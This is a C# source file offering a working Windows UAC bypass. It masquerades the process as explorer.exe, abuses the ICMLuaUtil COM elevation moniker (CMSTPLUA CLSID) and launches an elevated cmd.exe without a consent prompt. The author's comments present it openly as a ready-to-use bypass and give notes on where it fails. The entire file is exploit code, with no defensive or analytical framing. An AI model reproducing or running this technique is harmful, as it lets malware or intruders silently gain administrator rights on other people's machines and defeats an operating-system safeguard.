using ICMLuaUtilElevation.Helper;
using ICMLuaUtilElevation.Native.COM;
using System;
using System.Diagnostics;
using Vanara.PInvoke;

namespace ICMLuaUtilElevation
{
    internal class Program
    {
        // Notes:
        // This UAC bypass only available for console application
        // If you want to use it within an application which packaged by MSIX, you will be disappointed
        // The root cause seems related to the MSIX itself, which would add extra checks or change the behavior of API: Ole32.CoGetObject
        // Once you try the following code within a MSIX application, UAC will also pop up and bypass would failure for unknown reason
        // Any way, this might be the best C# implementation about bypass UAC from COM: ICMLuaUtil
        // All un-related code removed and I have make the clean up for you. Please enjoy it, thanks.
        public static void Main(string[] args)
        {
            Ole32.CoInitializeEx(coInit: Ole32.COINIT.COINIT_APARTMENTTHREADED);

            try
            {
                const ulong SEE_MASK_NOASYNC = 0x00000100;
                const ulong SEE_MASK_UNICODE = 0x00004000;

                using (PEBHelper.MasqueradePEB(@"C:\Windows\explorer.exe"))
                {
                    Ole32.BIND_OPTS3 Options = new Ole32.BIND_OPTS3
                    {
                        dwClassContext = Ole32.CLSCTX.CLSCTX_LOCAL_SERVER
                    };

                    if (Ole32.CoGetObject("Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}", Options, typeof(ICMLuaUtil).GUID, out object PPV).Succeeded)
                    {
                        ((ICMLuaUtil)PPV).ShellExec(@"C:\windows\system32\cmd.exe", null, null, SEE_MASK_NOASYNC | SEE_MASK_UNICODE, (int)ShowWindowCommand.SW_SHOWNORMAL).ThrowIfFailed();
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
            }
            finally
            {
                Ole32.CoUninitialize();
            }
        }
    }
}
